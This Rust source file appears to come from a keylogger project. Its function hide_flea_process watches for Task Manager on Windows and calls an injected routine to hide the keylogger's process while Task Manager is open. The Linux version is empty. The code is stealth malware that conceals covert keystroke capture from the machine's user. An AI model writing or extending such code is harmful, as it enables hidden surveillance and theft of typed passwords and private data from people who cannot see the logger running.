use std::sync::{Arc, Mutex};
use crate::keylogger::Keylogger;

#[cfg(target_os = "windows")]
pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
{
    use core::time;
    use std::thread;
    use crate::systemcmd::SystemCmd;

    extern {
        fn Inject() -> i32;
    }

    const WAIT_THREE_SECONDS: u64 = 3000;
    const TASK_MANAGER_PROCESS_NAME: &'static str = "Taskmgr.exe";

    let sys = SystemCmd::new();
    let mut hidden: bool = false;

    loop 
    {
        let proc_list = sys.get_process_list();

        //Check if task manager is running
        if proc_list.contains(TASK_MANAGER_PROCESS_NAME)
        {
            if !hidden
            {
                let ret_val: i32;

                unsafe { ret_val = Inject(); }
                if ret_val == 0
                {
                    hidden = true;
                }
                else
                {
                    break;
                }
            }
        }
        else
        {
            hidden = false;
        }

        let val = key_logger_data.lock().unwrap();
        if val.quit
        {
            break;
        }

        drop(val);

        let millis = time::Duration::from_millis(WAIT_THREE_SECONDS);
        thread::sleep(millis);
    }
}

#[cfg(target_os = "linux")]
pub fn hide_flea_process(key_logger_data: Arc<Mutex<Keylogger>>)
{        
}